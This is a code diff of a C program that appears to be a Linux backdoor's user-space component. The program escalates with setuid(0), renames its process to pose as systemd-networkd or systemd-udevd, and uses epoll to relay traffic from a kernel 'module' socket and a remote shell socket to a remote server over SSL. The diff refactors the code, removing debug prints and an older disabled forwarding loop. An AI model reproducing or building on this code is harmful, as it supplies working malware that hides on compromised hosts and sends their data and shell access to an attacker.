@@ -127,7 +127,7 @@ int createEpollFd(void) {
     return efd;
 }
 
-void addEpollSocket(const int epollfd, const int sock, struct epoll_event* ev) {
+void add_epoll_socket(const int epollfd, const int sock, struct epoll_event* ev) {
     if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, ev) == -1) {
         perror("epoll_ctl");
         exit(EXIT_FAILURE);
@@ -165,7 +165,6 @@ int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
 int main(int argc, char** argv) {
     const char* mask_1 = "/usr/lib/systemd/systemd-networkd";
     const char* mask_2 = "/usr/lib/systemd/systemd-udevd";
-    const char* mask_3 = "/usr/lib/systemd/systemd-timesyncd";
     if (setuid(0)) {
         perror("setuid");
         exit(EXIT_FAILURE);
@@ -231,20 +230,18 @@ int main(int argc, char** argv) {
         }
         setsid();
         mask_process(argv, mask_1);
-        //Lets make this the read process
-
-        struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
 
         int efd = createEpollFd();
+        struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
 
         struct epoll_event ev;
         ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
         ev.data.fd = conn_sock;
-        addEpollSocket(efd, conn_sock, &ev);
+        add_epoll_socket(efd, conn_sock, &ev);
         struct epoll_event eve;
         eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
         eve.data.fd = remote_shell_sock;
-        addEpollSocket(efd, remote_shell_sock, &eve);
+        add_epoll_socket(efd, remote_shell_sock, &eve);
 
         for (;;) {
             int n = waitForEpollEvent(efd, eventList);
@@ -264,54 +261,12 @@ int main(int argc, char** argv) {
                         goto done;
                     }
                     printf("Wrote %d bytes to server\n", size);
-                    for (int j = 0; j < size; ++j) {
-                        printf("%c", buffer[j]);
-                    }
-                    printf("\n");
                     SSL_write(ssl, buffer, size);
                 }
             }
         }
     done:
         free(eventList);
-
-#if 0
-        for (;;) {
-            int size = read(conn_sock, buffer, MAX_PAYLOAD);
-            printf("Read %d from module\n", size);
-            if (size < 0) {
-                perror("read");
-                break;
-            } else if (size == 0) {
-                break;
-            }
-            //if (buffer[0] == '!') {
-            //printf("Wrote %d to shell from module\n", size);
-            //write(remote_shell_sock, buffer, size);
-            //} else {
-            printf("Wrote %d to server from module \n", size);
-            for (int i = 0; i < size; ++i) {
-                printf("%c", buffer[i]);
-            }
-            printf("\n");
-            SSL_write(ssl, buffer, size);
-            //}
-        }
-
-        //Remote shell read and write to remote server
-        for (;;) {
-            int size = read(remote_shell_sock, buffer, MAX_PAYLOAD);
-            printf("Read %d from remote shell\n", size);
-            if (size < 0) {
-                perror("remote shell read");
-                break;
-            } else if (size == 0) {
-                break;
-            }
-            printf("Writing %d to server\n", size);
-            SSL_write(ssl, buffer, size);
-        }
-#endif
     } else {
         setsid();
         mask_process(argv, mask_2);
